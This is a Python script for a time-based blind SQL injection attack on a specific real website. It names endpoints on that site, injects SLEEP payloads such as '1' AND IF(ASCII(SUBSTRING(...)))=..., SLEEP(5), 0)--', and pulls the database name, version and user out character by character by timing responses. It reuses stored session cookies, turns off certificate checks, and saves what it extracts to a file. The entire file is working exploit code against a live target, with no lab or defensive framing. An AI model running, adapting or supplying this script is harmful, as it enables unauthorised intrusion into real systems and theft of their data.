#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import urllib3
urllib3.disable_warnings()

class TimeBasedExtraction:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_time_delay(self, endpoint, param, payload):
        """测试时间延迟"""
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            r = self.session.get(url, timeout=20)
            elapsed = time.time() - start
            return elapsed, r.status_code
        except:
            return None, None
    
    def extract_char_time_based(self, endpoint, param, query, position):
        """时间盲注逐字符提取"""
        # 测试基准时间
        normal_payload = "1"
        normal_time, _ = self.test_time_delay(endpoint, param, normal_payload)
        if normal_time is None:
            return None
        
        # 测试每个字符
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        for char in chars:
            payload = f"1' AND IF(ASCII(SUBSTRING(({query}), {position}, 1))={ord(char)}, SLEEP(5), 0)--"
            elapsed, _ = self.test_time_delay(endpoint, param, payload)
            
            if elapsed and elapsed > 4:
                return char
        
        return None
    
    def extract_string_time_based(self, endpoint, param, query, max_len=50):
        """时间盲注提取字符串"""
        print(f"\n[*] 提取: {query}")
        result = ""
        
        for i in range(1, max_len + 1):
            char = self.extract_char_time_based(endpoint, param, query, i)
            if char:
                result += char
                print(f"    [{i}] {char} -> {result}")
            else:
                break
        
        return result if result else None
    
    def run_all(self):
        """执行所有提取"""
        print("="*60)
        print("时间盲注提取数据库")
        print("="*60)
        
        # 测试最有可能的端点
        endpoints = [
            ('/Handle/SearchListWardByDistrictID', 'DistrictID'),
            ('/Account/GetUserInfo', 'id'),
            ('/Handle/SearchListProvince', 'Type'),
        ]
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        results = {}
        for endpoint, param in endpoints:
            print(f"\n[*] 测试端点: {endpoint} [{param}]")
            
            # 先测试时间盲注是否有效
            test_payload = "1' AND SLEEP(5)--"
            elapsed, status = self.test_time_delay(endpoint, param, test_payload)
            
            if elapsed and elapsed > 4:
                print(f"    [+] 时间盲注有效 (延迟: {elapsed:.2f}s)")
                
                for query, label in queries:
                    value = self.extract_string_time_based(endpoint, param, query)
                    if value:
                        results[label] = value
            else:
                print(f"    [-] 时间盲注无效 (延迟: {elapsed:.2f}s if elapsed else 'None')")
        
        # 保存结果
        with open('time_based_extraction_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("提取结果")
        print("="*60)
        for k, v in results.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    extractor = TimeBasedExtraction()
    extractor.run_all()